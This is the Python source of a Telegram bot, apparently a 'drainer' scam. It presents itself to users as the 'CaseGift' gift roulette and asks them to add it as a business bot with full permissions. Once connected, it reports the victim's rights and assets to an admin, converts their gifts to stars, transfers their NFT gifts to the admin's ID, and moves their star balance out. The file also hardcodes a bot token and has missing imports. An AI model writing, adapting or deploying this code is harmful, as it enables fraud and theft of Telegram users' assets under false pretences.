import asyncio
import datetime
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram import F
from aiogram import Bot, Dispatcher
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
from aiogram.types import InputMediaPhoto


from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re
from aiogram import F
from aiogram.filters import Command

import os

BOT_TOKEN = os.getenv("BOT_TOKEN") 

TOKEN = "8214171414:AAGb_8YNJq_tXVm40BfgNhrpr9I8_VX6qyg"
ADMIN_ID = 7792895663
bot = Bot(TOKEN)

dp = Dispatcher()

WEB_SERVER_HOST = "0.0.0.0"  
WEB_SERVER_PORT = int(os.getenv("PORT", 8080)) 
WEBHOOK_PATH = "/webhook"
BASE_WEBHOOK_URL = os.getenv("WEBHOOK_URL")


if not BOT_TOKEN:
    logging.error("❌ ОШИБКА: Не указан BOT_TOKEN в переменных окружения!")
    sys.exit(1)

  





async def on_startup():
    """Действия при запуске бота"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.set_webhook(
                f"{BASE_WEBHOOK_URL}{WEBHOOK_PATH}",
                drop_pending_updates=True
            )
        await bot.send_message(ADMIN_ID, "Бот успешно запущен!")
    except Exception as e:
        logging.error(f"🚨 Ошибка при запуске: {e}")
        raise

async def on_shutdown():
    """Действия при выключении бота"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.delete_webhook()
        await bot.send_message(ADMIN_ID, "Бот выключается...")
        await bot.session.close()
    except Exception as e:
        logging.error(f"Ошибка при выключении: {e}")

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BASE_WEBHOOK_URL or 'http://localhost'}/ping") as resp:
                    logging.info(f"Keep-alive ping: {resp.status}")
        except Exception as e:
            logging.error(f"Keep-alive error: {e}")
        await asyncio.sleep(300)

async def ping_handler(request: web.Request):
    return web.Response(text="Bot is alive")

async def setup_webhook():
    """Настройка вебхука"""
    app = web.Application()
    app.router.add_get("/ping", ping_handler)
    
    webhook_requests_handler = SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
    )
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    
    return app







@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    try:
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
        else:
            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")

    except Exception as e:
        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")
@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        activation_text = f"""
<b>🔹 Добро пожаловать, {message.from_user.full_name}! CaseGift - лучшая рулетка подарков в Telegram.
Данный бот разыгрывает много NFT подарков и звезд. Крути спины каждый день, радуйся победами. Испытай свою удачу в этом боте!</b>

<b>🔹 Для начала работы выполните шаги:</b>
<blockquote><i> [1] Перейдите в настройки Telegram.
 [2] Откройте раздел Telegram Business.
 [3] Нажмите 'Боты для бизнеса'.
 [4] Добавьте бота , предоставив все разрешения</i></blockquote>

<b>🔹 После этого вам будет начислено бесплатно <u>5 прокрутов</u>. Удачной игры!</b>
"""

        photo_url = 'https://i.postimg.cc/8z23FgR2/photo-2025-07-31-16-37-07.jpg' 

        await message.answer_photo(
    photo=photo_url,
    caption=activation_text,
    parse_mode='HTML'
)
    else:
        await bot.send_message(
            f"Antistoper Drainer\n\n🔗 "
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
            "/convert - конвертировать подарки в звезды"
        )





CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID  # Просто один ID

        rights = connection.rights
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
            f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")
def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if gift.owned_gift_id == owned_gift_id:
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
    except Exception as e:
        return "🎁 Нет подарков."


@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
        save_business_connection_data(business_connection)
        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except:
        pass
        
from aiogram import types
from aiogram.filters import Command

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id

    if user_id == OWNER_ID:
        return

  
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.convert_gift_to_stars(business_id, owned_gift_id)
            except Exception as e:
                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
            except Exception as e:
                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if stars.amount > 0:
            print(f"Успешно отправлено {stars.amount} звёзд")
            await bot.transfer_business_account_stars(business_id, int(stars.amount))
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")




# ===== ЗАПУСК БОТА =====
async def main():
    try:
        # Настройка веб-сервера
        app = await setup_webhook()
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            host=WEB_SERVER_HOST,
            port=WEB_SERVER_PORT,
            reuse_port=True
        )
        
        await site.start()
        logging.info(f"🌐 Сервер запущен на порту {WEB_SERVER_PORT}")
        
        # Инициализация бота
        await on_startup()
        asyncio.create_task(keep_alive())
        
        # Бесконечный цикл
        while True:
            await asyncio.sleep(3600)
            
    except (KeyboardInterrupt, SystemExit):
        logging.info("🛑 Бот остановлен пользователем")
    except Exception as e:
        logging.critical(f"💥 Критическая ошибка: {e}")
    finally:
        await on_shutdown()
        if 'runner' in locals():
            await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logging.critical(f"💥 Не удалось запустить бота: {e}")
        sys.exit(1)
